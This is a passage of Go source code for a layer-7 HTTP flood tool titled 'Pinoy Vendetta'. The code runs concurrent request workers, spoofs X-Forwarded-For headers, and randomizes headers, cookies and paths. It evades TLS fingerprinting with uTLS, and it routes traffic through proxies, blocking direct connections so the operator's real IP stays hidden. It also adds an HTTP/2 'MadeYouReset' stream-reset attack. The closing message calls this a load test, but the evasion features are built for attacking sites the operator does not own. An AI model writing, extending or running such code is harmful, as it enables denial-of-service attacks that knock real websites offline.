	419: "Page Expired (Laravel)", 420: "Enhance Your Calm (Twitter)", 421: "Misdirected Request",
	422: "Unprocessable Content", 423: "Locked", 424: "Failed Dependency", 425: "Too Early",
	426: "Upgrade Required", 428: "Precondition Required", 429: "Too Many Requests",
	430: "Request Header Fields Too Large (Shopify)", 431: "Request Header Fields Too Large",
	440: "Login Time-out (Microsoft)", 444: "No Response (Nginx)", 449: "Retry With (Microsoft)",
	450: "Blocked by Windows Parental Controls", 451: "Unavailable For Legal Reasons",
	460: "Client Closed Connection (AWS ELB)", 463: "X-Forwarded-For Too Large (AWS ELB)",
	494: "Request Header Too Large (Nginx)", 495: "SSL Certificate Error (Nginx)",
	496: "SSL Certificate Required (Nginx)", 497: "HTTP to HTTPS (Nginx)", 498: "Invalid Token (Esri)",
	499: "Client Closed Request (Nginx)",
	500: "Internal Server Error", 501: "Not Implemented", 502: "Bad Gateway", 503: "Service Unavailable",
	504: "Gateway Timeout", 505: "HTTP Version Not Supported", 506: "Variant Also Negotiates",
	507: "Insufficient Storage", 508: "Loop Detected", 509: "Bandwidth Limit Exceeded (cPanel)",
	510: "Not Extended", 511: "Network Authentication Required",
	520: "Unknown Error (Cloudflare)", 521: "Web Server Is Down (Cloudflare)",
	522: "Connection Timed Out (Cloudflare)", 523: "Origin Is Unreachable (Cloudflare)",
	524: "A Timeout Occurred (Cloudflare)", 525: "SSL Handshake Failed (Cloudflare)",
	526: "Invalid SSL Certificate (Cloudflare)", 527: "Railgun Error (Cloudflare)",
	529: "Site is overloaded", 530: "Site is frozen", 561: "Unauthorized (AWS ELB)",
	598: "Network Read Timeout Error", 599: "Network Connect Timeout Error",
}

var (
	titleColor      = color.New(color.FgHiCyan, color.Bold)
	headerColor     = color.New(color.FgYellow)
	valueColor      = color.New(color.FgGreen)
	statusOkColor   = color.New(color.FgGreen)
	statusWarnColor = color.New(color.FgYellow)
	statusErrColor  = color.New(color.FgRed)
)

func getRandomElement(slice []string) string {
	return slice[mathrand.Intn(len(slice))]
}

func getRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", mathrand.Intn(255)+1, mathrand.Intn(256), mathrand.Intn(256), mathrand.Intn(256))
}

func randomHeaderName(s string) string {
	var out strings.Builder
	for _, c := range s {
		if mathrand.Intn(2) == 0 {
			out.WriteString(strings.ToUpper(string(c)))
		} else {
			out.WriteString(strings.ToLower(string(c)))
		}
	}
	return out.String()
}

func generateRandomCookies() string {
	var cookies []string
	count := mathrand.Intn(3) + 1
	for i := 0; i < count; i++ {
		cookies = append(cookies, fmt.Sprintf("%s=%x", getRandomElement(cookieNames), mathrand.Intn(0xffffff)))
	}
	return strings.Join(cookies, "; ")
}

func generateRandomPayload(format string) (io.Reader, string) {
	switch format {
	case "json":
		body := fmt.Sprintf(`{"id":%d,"name":"user%d","random":"%x"}`, mathrand.Intn(1000), mathrand.Intn(1000), mathrand.Intn(0xffffff))
		return strings.NewReader(body), "application/json"
	case "form":
		body := fmt.Sprintf("id=%d&name=user%d&token=%x", mathrand.Intn(1000), mathrand.Intn(1000), mathrand.Intn(0xffffff))
		return strings.NewReader(body), "application/x-www-form-urlencoded"
	default:
		size := mathrand.Intn(1024*10) + 1024
		data := make([]byte, size)
		rand.Read(data)
		return strings.NewReader(string(data)), "text/plain"
	}
}

func randomPath(base string) string {
	parsed, _ := url.Parse(base)
	parsed.Path += "/" + fmt.Sprintf("%x", mathrand.Intn(0xfffff))
	q := parsed.Query()
	q.Set("v", fmt.Sprintf("%d", mathrand.Intn(99999)))
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

func logMessage(msg string) {
	logMessagesMux.Lock()
	defer logMessagesMux.Unlock()
	logMessages = append(logMessages, time.Now().Format("15:04:05")+" "+msg)
	if len(logMessages) > 3 {
		logMessages = logMessages[len(logMessages)-3:]
	}
}

func recordError(errType string) {
	errorMux.Lock()
	defer errorMux.Unlock()
	errorTypes[errType]++
}
func loadProxies(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if line := strings.TrimSpace(scanner.Text()); line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}
func detectSupportedHTTPVersions(target string, insecureTLS bool) []string {
	supportedVersionsSet := make(map[string]struct{})
	parsed, err := url.Parse(target)
	if err != nil {
		return []string{"1.1"}
	}
	host := parsed.Hostname()
	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

	h3RoundTripper := &http3.RoundTripper{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureTLS, ServerName: host},
	}
	h3Client := &http.Client{Transport: h3RoundTripper, Timeout: 3 * time.Second}
	reqH3, _ := http.NewRequest("HEAD", target, nil)
	reqH3.Header.Set("User-Agent", userAgent)
	respH3, errH3 := h3Client.Do(reqH3)
	if errH3 == nil && respH3 != nil {
		if respH3.ProtoMajor == 3 {
			supportedVersionsSet["3"] = struct{}{}
		}
		respH3.Body.Close()
	}
	h3RoundTripper.Close()

	h2Transport := &http2.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureTLS, ServerName: host},
	}
	h2Client := &http.Client{Transport: h2Transport, Timeout: 3 * time.Second}
	reqH2, _ := http.NewRequest("HEAD", target, nil)
	reqH2.Header.Set("User-Agent", userAgent)
	respH2, errH2 := h2Client.Do(reqH2)
	if errH2 == nil && respH2 != nil {
		if respH2.ProtoMajor == 2 {
			supportedVersionsSet["2"] = struct{}{}
		}
		respH2.Body.Close()
	}

	h1Transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureTLS, ServerName: host},
		TLSNextProto:    make(map[string]func(string, *tls.Conn) http.RoundTripper),
	}
	h1Client := &http.Client{Transport: h1Transport, Timeout: 3 * time.Second}
	reqH1, _ := http.NewRequest("HEAD", target, nil)
	reqH1.Header.Set("User-Agent", userAgent)
	respH1, errH1 := h1Client.Do(reqH1)
	if errH1 == nil && respH1 != nil {
		if respH1.ProtoMajor == 1 && respH1.ProtoMinor == 1 {
			supportedVersionsSet["1.1"] = struct{}{}
		}
		respH1.Body.Close()
	}

	if len(supportedVersionsSet) == 0 {
		return []string{"1.1"}
	}
	result := make([]string, 0, len(supportedVersionsSet))
	for v := range supportedVersionsSet {
		result = append(result, v)
	}
	sort.Strings(result)
	return result
}

func madeYouResetAttack(parentCtx context.Context, config *workerConfig, client *http.Client, ua string) {
	select {
	case <-parentCtx.Done():
		return
	default:
	}
	method := getRandomElement(config.methods)
	var body io.Reader
	var contentType string
	if method != "GET" && method != "HEAD" {
		format := getRandomElement(payloadFormats)
		body, contentType = generateRandomPayload(format)
	}
	req, err := http.NewRequestWithContext(parentCtx, method, config.targetURL, body)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", ua) // ใช้ UA ที่ส่งมา
	req.Header.Set("Cache-Control", "no-store")
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	atomic.AddUint64(&requestsSent, 1)
	atomic.AddUint64(&madeYouResetAttempts, 1)
	resp, err := client.Do(req)
	if err != nil {
		var streamErr http2.StreamError
		if errors.As(err, &streamErr) {
			atomic.AddUint64(&madeYouResetSuccess, 1)
			logMessage(statusOkColor.Sprintf("[H2-RESET] Success"))
		}
	} else if resp != nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		atomic.AddUint64(&responsesRec, 1)
	}
}

func buildUTLSConn(insecureTLS bool, sni string, proxyList []string, helloID utls.ClientHelloID) func(ctx context.Context, network, addr string) (net.Conn, error) {
	return func(ctx context.Context, network, addr string) (net.Conn, error) {
		var conn net.Conn

		if len(proxyList) > 0 {
			pAddr := proxyList[mathrand.Intn(len(proxyList))]
			if !strings.Contains(pAddr, "://") {
				pAddr = "http://" + pAddr
			}
			pURL, err := url.Parse(pAddr)
			if err != nil {
				return nil, err
			}

			if strings.HasPrefix(pURL.Scheme, "socks") {
				// --- รองรับ SOCKS4, SOCKS5 ---
				dialer, err := proxy.FromURL(pURL, proxy.Direct)
				if err != nil {
					return nil, err
				}
				conn, err = dialer.Dial("tcp", addr)
				if err != nil {
					return nil, err
				}
			} else {
				// --- รองรับ HTTP และ HTTPS Proxy ---
				dialer := &net.Dialer{Timeout: 15 * time.Second}
				conn, err = dialer.DialContext(ctx, "tcp", pURL.Host)
				if err != nil {
					return nil, err
				}

				// หากเป็น HTTPS Proxy ให้หุ้มการเชื่อมต่อด้วย TLS ก่อนส่ง CONNECT
				if pURL.Scheme == "https" {
					tlsConn := tls.Client(conn, &tls.Config{
						ServerName:         pURL.Hostname(),
						InsecureSkipVerify: true,
					})
					if err := tlsConn.HandshakeContext(ctx); err != nil {
						conn.Close()
						return nil, err
					}
					conn = tlsConn
				}

				// ส่งคำสั่ง CONNECT (ใช้ได้กับทั้ง HTTP และ HTTPS Tunnel)
				fmt.Fprintf(conn, "CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", addr, addr)

				br := bufio.NewReader(conn)
				var resp *http.Response
				resp, err = http.ReadResponse(br, nil)
				if err != nil {
					conn.Close()
					return nil, err
				}

				defer resp.Body.Close() // ปิด Body เสมอตามหลักของ Go
				if resp.StatusCode != 200 {
					conn.Close()
					return nil, fmt.Errorf("proxy err: %d", resp.StatusCode)
				}
			}
		} else {
			// --- โหมดป้องกัน IP จริง: ปิดการต่อตรงชั่วคราว ---
			// หากโปรแกรมวิ่งมาถึงจุดนี้ แสดงว่าไม่มี Proxy ให้ใช้งาน
			// เราจะสั่งให้ Error ทันทีเพื่อไม่ให้เครื่องใช้ IP จริงเชื่อมต่อไปยังเป้าหมาย
			return nil, fmt.Errorf("SECURITY ALERT: Direct connection blocked to protect real IP")

			/* หากต้องการกลับมาเปิดใช้งาน IP จริงในอนาคต ให้ลบบรรทัดบนแล้วเอาคอมเมนต์ส่วนนี้ออก:
			dialer := &net.Dialer{Timeout: 30 * time.Second, KeepAlive: 30 * time.Second}
			conn, err = dialer.DialContext(ctx, network, addr)
			if err != nil {
				return nil, err
			}
			*/
		}

		// ทำ uTLS Handshake ไปยังเป้าหมายสุดท้าย (Target)
		uTlsConfig := &utls.Config{ServerName: sni, InsecureSkipVerify: insecureTLS}
		uconn := utls.UClient(conn, uTlsConfig, helloID)
		if err := uconn.HandshakeContext(ctx); err != nil {
			conn.Close()
			return nil, err
		}
		return uconn, nil
	}
}

func buildHTTPClient(config *workerConfig, httpVersion string, ua string) *http.Client {
	sni := randomSNI(config.targetURL)
	helloID := getMatchingTLSProfile(ua) // หาคู่ TLS ที่ตรงกับ UA
	dialer := buildUTLSConn(config.insecureTLS, sni, config.proxyList, helloID)

	if httpVersion == "2" {
		h2Transport := &http2.Transport{
			DialTLSContext: func(ctx context.Context, network, addr string, _ *tls.Config) (net.Conn, error) {
				return dialer(ctx, network, addr)
			},
		}
		return &http.Client{Transport: h2Transport, Timeout: 30 * time.Second}
	}
	transport := &http.Transport{
		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			return dialer(ctx, network, addr)
		},
		TLSNextProto: make(map[string]func(string, *tls.Conn) http.RoundTripper),
	}
	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
}

func buildHTTP3Client(config *workerConfig) *http.Client {
	return &http.Client{
		Transport: &http3.RoundTripper{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: config.insecureTLS, ServerName: randomSNI(config.targetURL)},
			DisableCompression: false,
		},
		Timeout: 30 * time.Second,
	}
}

func randomSNI(rawURL string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil || !strings.Contains(parsed.Host, ".") {
		return ""
	}
	return parsed.Hostname()
}

func isTransientErr(err error) bool {
	return strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "connection reset")
}

type workerConfig struct {
	targetURL         string
	methods           []string
	ipRandom          bool
	pathRandom        bool
	retry             bool
	burst             bool
	burstSize         int
	jitterMs          int
	insecureTLS       bool
	supportedVersions []string
	adaptiveDelay     bool
	thinkTimeMs       int
	proxyList         []string
}

func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpVersion string) {
	defer func() {
		if r := recover(); r != nil {
			logMessage(fmt.Sprintf("[PANIC] Worker %s recovered: %v", httpVersion, r))
		}
		wg.Done()
	}()

	var client *http.Client
	var burstsSinceLastCycle int
	const clientCycleThreshold = 50

	// 1. สุ่มชื่อ UA ไว้ที่นี่
	selectedUA := getRandomElement(userAgents)

	if httpVersion == "3" {
		client = buildHTTP3Client(config)
	} else {
		// 2. ส่ง selectedUA เข้าไปให้ครบ 3 ค่า
		client = buildHTTPClient(config, httpVersion, selectedUA)
	}

	if httpVersion == "2" {
		go func() {
			ticker := time.NewTicker(time.Duration(100+mathrand.Intn(200)) * time.Millisecond)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					for i := 0; i < 3+mathrand.Intn(5); i++ {
						madeYouResetAttack(ctx, config, client, selectedUA)
					}
				}
			}
		}()
	}

	for {
		if burstsSinceLastCycle > clientCycleThreshold {
			if transport, ok := client.Transport.(interface{ CloseIdleConnections() }); ok {
				transport.CloseIdleConnections()
			}
			if httpVersion == "3" {
				client = buildHTTP3Client(config)
			} else {
				client = buildHTTPClient(config, httpVersion, selectedUA)
			}
			burstsSinceLastCycle = 0
			logMessage(fmt.Sprintf("[H%s] Client cycled (new JA3/H2 fingerprint)", httpVersion))
		}

		var burstCount int
		if config.burst {
			burstCount = 1 + mathrand.Intn(config.burstSize)
		} else {
			burstCount = 1
		}

		for i := 0; i < burstCount; i++ {
			select {
			case <-ctx.Done():
				return
			default:
				method := getRandomElement(config.methods)
				var reqURL string = config.targetURL
				if config.pathRandom {
					reqURL = randomPath(config.targetURL)
				}
				var payload io.Reader = nil
				contentType := ""
				if method == "POST" || method == "PUT" || method == "PATCH" {
					format := getRandomElement(payloadFormats)
					payload, contentType = generateRandomPayload(format)
				}

				req, err := http.NewRequestWithContext(ctx, method, reqURL, payload)
				if err != nil {
					recordError("req_create_error")
					continue
				}

				headerSet := map[string]string{
					randomHeaderName("User-Agent"):      selectedUA,
					randomHeaderName("Accept-Language"): getRandomElement(languages),
					randomHeaderName("Referer"):         getRandomElement(referers),
					randomHeaderName("Accept"):          getRandomElement(accepts),
					randomHeaderName("Accept-Encoding"): getRandomElement(acceptEncodings),
					randomHeaderName("Connection"):      "keep-alive",
					randomHeaderName("Cookie"):          generateRandomCookies(),
				}
				if contentType != "" {
					headerSet[randomHeaderName("Content-Type")] = contentType
				}
				if config.ipRandom {
					ip := getRandomIP()
					headerSet[randomHeaderName("X-Forwarded-For")] = ip
					headerSet[randomHeaderName("X-Real-IP")] = ip
				}
				for _, h := range customHeaders {
					headerSet[randomHeaderName(h)] = getRandomElement([]string{"1", "no-cache", "XMLHttpRequest", "on", "off"})
				}
				keys := make([]string, 0, len(headerSet))
				for k := range headerSet {
					keys = append(keys, k)
				}
				mathrand.Shuffle(len(keys), func(i, j int) { keys[i], keys[j] = keys[j], keys[i] })
				for _, k := range keys {
					req.Header.Set(k, headerSet[k])
				}

				atomic.AddUint64(&requestsSent, 1)
				start := time.Now()
				resp, err := client.Do(req)
				latency := time.Since(start).Milliseconds()
				atomic.AddInt64(&totalLatency, latency)

				if err != nil {
					if err != context.Canceled {
						logMessage(fmt.Sprintf("[H%s] Client Error: %v", httpVersion, err))
						recordError("client_error")
					}
					if config.retry && isTransientErr(err) {
						time.Sleep(50 * time.Millisecond)
					}
					if config.adaptiveDelay {
						var delayToAdd int64
						if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
							delayToAdd = 150
						} else if strings.Contains(err.Error(), "connection reset") {
							delayToAdd = 150
						}
						if delayToAdd > 0 {
							newDelay := atomic.AddInt64(&currentDelay, delayToAdd)
							if newDelay > maxAdaptiveDelay {
								atomic.StoreInt64(&currentDelay, maxAdaptiveDelay)
							}
						}
					}
					continue
				}

				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
				atomic.AddUint64(&responsesRec, 1)

				statusCountsMux.Lock()
				if _, ok := statusCounts[httpVersion]; !ok {
					statusCounts[httpVersion] = make(map[int]uint64)
				}
				statusCounts[httpVersion][resp.StatusCode]++
				statusCountsMux.Unlock()

				if config.adaptiveDelay {
					var delayToAdd int64 = 0
					switch resp.StatusCode {
					case 401, 403, 429, 430, 431, 451, 460, 463, 494, 499:
						delayToAdd = 150
					case 400, 406, 410, 412, 417, 421, 422, 423:
						delayToAdd = 75
					case 413, 444:
						delayToAdd = 50
					}
					if delayToAdd > 0 {
						newDelay := atomic.AddInt64(&currentDelay, delayToAdd)
						if newDelay > maxAdaptiveDelay {
							atomic.StoreInt64(&currentDelay, maxAdaptiveDelay)
						}
					}
				}
				statusText, ok := statusCodeDescriptions[resp.StatusCode]
				if !ok {
					statusText = "Unknown"
				}
				logMessage(fmt.Sprintf("[H%s] %s -> %d %s (%dms)", httpVersion, reqURL, resp.StatusCode, statusText, latency))

				if i < burstCount-1 {
					pacingDelay := time.Duration(50+mathrand.Intn(200)) * time.Millisecond
					time.Sleep(pacingDelay)
				}
			}
		}

		burstsSinceLastCycle++

		var baseDelay int64
		if config.adaptiveDelay {
			baseDelay = atomic.LoadInt64(&currentDelay)
		}
		thinkTime := mathrand.Int63n(int64(config.thinkTimeMs))
		jitter := mathrand.Int63n(int64(config.jitterMs))

		time.Sleep(time.Duration(baseDelay+thinkTime+jitter) * time.Millisecond)
	}
}

func monitor(ctx context.Context, duration time.Duration, config *workerConfig) {
	startTime := time.Now()
	endTime := startTime.Add(duration)
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()
	fmt.Print("\033[H\033[J")

	for {
		select {
		case <-ctx.Done():
			printProgress(endTime, startTime, config)
			fmt.Println("\n\nLoad test finished.")
			return
		case <-ticker.C:
			printProgress(endTime, startTime, config)
			if config.adaptiveDelay {
				current := atomic.LoadInt64(&currentDelay)
				if current > 0 {
					newDelay := int64(float64(current) * 0.92)
					atomic.StoreInt64(&currentDelay, newDelay)
				}
			}
		}
	}
}

var ansiRegex = regexp.MustCompile("[\u001B\u009B][[\\]()#;?]*(?:(?:[a-zA-Z\\d]*(?:;[a-zA-Z\\d]*)*)?\u0007|(?:\u001B\\[)?[0-9;=?>!]*[ -/]*[@-~])")

func stripAnsi(str string) string {
	return ansiRegex.ReplaceAllString(str, "")
}

func printProgress(endTime, startTime time.Time, config *workerConfig) {
	var sb strings.Builder
	sb.WriteString("\033[H\033[J")
	remaining := time.Until(endTime)
	if remaining < 0 {
		remaining = 0
	}
	elapsed := time.Since(startTime)
	reqSent := atomic.LoadUint64(&requestsSent)
	resRec := atomic.LoadUint64(&responsesRec)
	var rps float64
	if elapsed.Seconds() > 0 {
		rps = float64(reqSent) / elapsed.Seconds()
	}
	var avgLatency float64
	if resRec > 0 {
		avgLatency = float64(atomic.LoadInt64(&totalLatency)) / float64(resRec)
	}

	sb.WriteString(titleColor.Sprint("--- Pinoy Vendetta Layer 7 (Multi-Protocol, Evasive, Distributed-Ready) ---\n"))
	sb.WriteString(headerColor.Sprint("---------------------------------------------------------------------------------------------------------------------------------------------------------------\n"))

	left := []string{
		fmt.Sprintf("%-25s %s", "Random UA:", statusString(true)),
		fmt.Sprintf("%-25s %s", "Random IP:", statusString(config.ipRandom)),
		fmt.Sprintf("%-25s %s", "Random Paths:", statusString(config.pathRandom)),
		fmt.Sprintf("%-25s %s", "Burst & Think Mode:", statusString(config.burst)),
		fmt.Sprintf("%-25s %s", "Retry on Error:", statusString(config.retry)),
		fmt.Sprintf("%-25s %s", "Adaptive Delay:", statusString(config.adaptiveDelay)),
	}
	isH2Active := false
	for _, v := range config.supportedVersions {
		if v == "2" {
			isH2Active = true
			break
		}
	}
	left = append(left, fmt.Sprintf("%-25s %s", "H2 MadeYouReset Attack:", statusString(isH2Active)))
	left = append(left, fmt.Sprintf("%-25s %s", "JA3 Fingerprint Evasion:", valueColor.Sprint("Enabled")))

	right := []string{
		fmt.Sprintf("%-18s %s", "Time Remaining:", remaining.Round(time.Second)),
		fmt.Sprintf("%-18s %d", "Requests Sent:", reqSent),
		fmt.Sprintf("%-18s %d", "Responses Recv:", resRec),
		fmt.Sprintf("%-18s %.2f", "Reqs/Second:", rps),
		fmt.Sprintf("%-18s %.2fms", "Avg Latency:", avgLatency),
		fmt.Sprintf("%-18s %dms", "Adaptive Delay:", atomic.LoadInt64(&currentDelay)),
		fmt.Sprintf("%-18s %s", "Target:", config.targetURL),
		fmt.Sprintf("%-18s %s", "Active Versions:", valueColor.Sprint(strings.Join(config.supportedVersions, ", "))),
	}
	maxRows := len(left)
	if len(right) > maxRows {
		maxRows = len(right)
	}
	rightColStart := 85
	for i := 0; i < maxRows; i++ {
		leftStr := ""
		rightStr := ""
		if i < len(left) {
			leftStr = left[i]
		}
		if i < len(right) {
			rightStr = right[i]
		}
		sb.WriteString(leftStr)
		sb.WriteString(strings.Repeat(" ", rightColStart-len(leftStr)))
		sb.WriteString(rightStr)
		sb.WriteString("\n")
	}

	sb.WriteString(headerColor.Sprint("---------------------------------------------------------------------------------------------------------------------------------------------------------------\n"))
	sb.WriteString(headerColor.Sprint("Response Status Counts:\n"))

	statusCountsMux.Lock()
	protocols := []string{"1.1", "2", "3"}
	protocolData := make(map[string][]string)
	maxStatusRows := 0

	for _, p := range protocols {
		var lines []string
		if protoMap, ok := statusCounts[p]; ok {
			codes := make([]int, 0, len(protoMap))
			for code := range protoMap {
				codes = append(codes, code)
			}
			sort.Ints(codes)

			for _, code := range codes {
				count := protoMap[code]
				statusText, _ := statusCodeDescriptions[code]
				var statusColor *color.Color
				if code >= 200 && code < 300 {
					statusColor = statusOkColor
				} else if code >= 400 && code < 500 {
					statusColor = statusWarnColor
				} else {
					statusColor = statusErrColor
				}
				lines = append(lines, statusColor.Sprintf("  %d (%s): %d", code, statusText, count))
			}
		}
		protocolData[p] = lines
		if len(lines) > maxStatusRows {
			maxStatusRows = len(lines)
		}
	}
	statusCountsMux.Unlock()

	headers := map[string]string{"1.1": "H1.1:", "2": "H2:", "3": "H3:"}
	colWidth := 50
	headerLine := ""
	for _, p := range protocols {
		headerLine += fmt.Sprintf("%-*s", colWidth, headers[p])
	}
	sb.WriteString(headerColor.Sprint(headerLine + "\n"))

	for i := 0; i < maxStatusRows; i++ {
		rowLine := ""
		for _, p := range protocols {
			line := ""
			if i < len(protocolData[p]) {
				line = protocolData[p][i]
			}
			padding := colWidth - len(stripAnsi(line))
			if padding < 0 {
				padding = 0
			}
			rowLine += line + strings.Repeat(" ", padding)
		}
		sb.WriteString(rowLine + "\n")
	}

	errorMux.Lock()
	if len(errorTypes) > 0 {
		sb.WriteString(headerColor.Sprint("Error Types:\n"))
		errKeys := make([]string, 0, len(errorTypes))
		for k := range errorTypes {
			errKeys = append(errKeys, k)
		}
		sort.Strings(errKeys)
		for _, k := range errKeys {
			v := errorTypes[k]
			sb.WriteString(statusErrColor.Sprintf("  %s: %d\n", k, v))
		}
	}
	errorMux.Unlock()

	if isH2Active {
		attempts := atomic.LoadUint64(&madeYouResetAttempts)
		success := atomic.LoadUint64(&madeYouResetSuccess)
		errors := atomic.LoadUint64(&madeYouResetErrors)

		sb.WriteString(headerColor.Sprint("H2 MadeYouReset Attack Stats:\n"))
		sb.WriteString(fmt.Sprintf("  %-20s %d\n", "Attempts:", attempts))
		sb.WriteString(statusOkColor.Sprintf("  %-20s %d\n", "Successful Resets:", success))
		sb.WriteString(statusErrColor.Sprintf("  %-20s %d\n", "Errors:", errors))
	}

	logMessagesMux.Lock()
	logs := make([]string, len(logMessages))
	copy(logs, logMessages)
	logMessagesMux.Unlock()
	sb.WriteString(headerColor.Sprint("---------------------------------------------------------------------------------------------------------------------------------------------------------------\n"))
	sb.WriteString(headerColor.Sprint("Log (last 3 events):\n"))
	for i := len(logs) - 1; i >= 0; i-- {
		sb.WriteString(logs[i] + "\n")
	}
	fmt.Print(sb.String())
}

func statusString(enabled bool) string {
	if enabled {
		return valueColor.Sprint("Enabled")
	}
	return statusErrColor.Sprint("Disabled")
}

func main() {
	flag.Usage = func() {
		titleColor.Fprintf(color.Output, "Usage of %s:\n", os.Args[0])
		flag.PrintDefaults()
	}
	urlPtr := flag.String("url", "", "Target URL (e.g., https://example.com) (required)")
	portPtr := flag.String("port", "", "Target port (optional, overrides URL)")
	durationPtr := flag.Int("duration", 5, "Test duration in minutes")
	methodsPtr := flag.String("http-method", "GET,POST", "Comma-separated HTTP methods")
	httpProtocolPtr := flag.String("http-protocol", "", "Force specific HTTP protocols (e.g., \"1.1,2,3\"). If not set, auto-detects.")
	concurrencyPtr := flag.Int("concurrency", 100, "Total concurrent worker goroutines")
	pathRandPtr := flag.Bool("random-path", false, "Randomize request paths/queries")
	jitterPtr := flag.Int("jitter", 50, "Maximum jitter (ms) per request")
	burstSizePtr := flag.Int("burst-size", 15, "Max number of requests per worker burst")
	adaptiveDelayPtr := flag.Bool("adaptive-delay", false, "Enable adaptive delay to throttle requests based on server response")
	thinkTimePtr := flag.Int("think-time", 7000, "Max think time (ms) between bursts")
	burstPtr := flag.Bool("burst", true, "Enable Burst & Think mode")
	proxyFilePtr := flag.String("p", "", "Path to proxy file (optional)")

	flag.Parse()

	// --- 1. ประกาศตัวแปรที่จำเป็นไว้ที่นี่ที่เดียว ---
	var err error
	var proxyList []string
	var parsedURL *url.URL

	// --- 2. จัดการ Proxy ---
	if *proxyFilePtr != "" {
		proxyList, err = loadProxies(*proxyFilePtr)
		if err != nil {
			statusErrColor.Printf("Error: Could not load proxy file: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("Successfully loaded %d proxies\n", len(proxyList))
	}

	if *urlPtr == "" {
		fmt.Println()
		statusErrColor.Println("Error: --url is required.")
		flag.Usage()
		return
	}

	finalURL := *urlPtr
	if !strings.HasPrefix(finalURL, "http") {
		finalURL = "https://" + finalURL
	}

	// --- 3. ตรวจสอบ URL (จุดที่เคยเป็นบรรทัด 897) ---
	parsedURL, err = url.Parse(finalURL)
	if err != nil {
		statusErrColor.Printf("Error: Invalid URL provided: %v\n", err)
		return
	}

	if *portPtr != "" {
		host, _, err := net.SplitHostPort(parsedURL.Host)
		if err != nil {
			host = parsedURL.Host
		}
		parsedURL.Host = net.JoinHostPort(host, *portPtr)
		finalURL = parsedURL.String()
	}

	methods := strings.Split(*methodsPtr, ",")
	duration := time.Duration(*durationPtr) * time.Minute
	ctx, cancel := context.WithTimeout(context.Background(), duration)
	defer cancel()

	var supportedVersions []string

	if *httpProtocolPtr != "" {
		supportedVersions = strings.Split(*httpProtocolPtr, ",")
		for i, v := range supportedVersions {
			supportedVersions[i] = strings.TrimSpace(v)
		}
		fmt.Printf("Forcing attack protocols as specified: %s\n", strings.Join(supportedVersions, ", "))
	} else {
		fmt.Println("Detecting supported HTTP versions on target...")
		supportedVersions = detectSupportedHTTPVersions(finalURL, true)
		fmt.Printf("Attack protocols detected: %s\n", strings.Join(supportedVersions, ", "))
		time.Sleep(2 * time.Second)
	}

	config := &workerConfig{
		targetURL:         finalURL,
		methods:           methods,
		ipRandom:          true,
		pathRandom:        *pathRandPtr,
		retry:             true,
		burst:             *burstPtr,
		burstSize:         *burstSizePtr,
		jitterMs:          *jitterPtr,
		insecureTLS:       true,
		supportedVersions: supportedVersions,
		adaptiveDelay:     *adaptiveDelayPtr,
		thinkTimeMs:       *thinkTimePtr,
		proxyList:         proxyList,
	}

	var wg sync.WaitGroup
	for i := 0; i < *concurrencyPtr; i++ {
		wg.Add(1)
		assignedVersion := supportedVersions[i%len(supportedVersions)]
		go worker(ctx, &wg, config, assignedVersion)
	}

	go monitor(ctx, duration, config)

	wg.Wait()
}
func getMatchingTLSProfile(ua string) utls.ClientHelloID {
	uaLower := strings.ToLower(ua)
	if strings.Contains(uaLower, "chrome") || strings.Contains(uaLower, "criose") {
		return utls.HelloChrome_Auto
	}
	if strings.Contains(uaLower, "firefox") || strings.Contains(uaLower, "fxios") {
		return utls.HelloFirefox_Auto
	}
	if strings.Contains(uaLower, "safari") && !strings.Contains(uaLower, "chrome") {
		return utls.HelloSafari_16_0
	}
	return utls.HelloRandomized
}
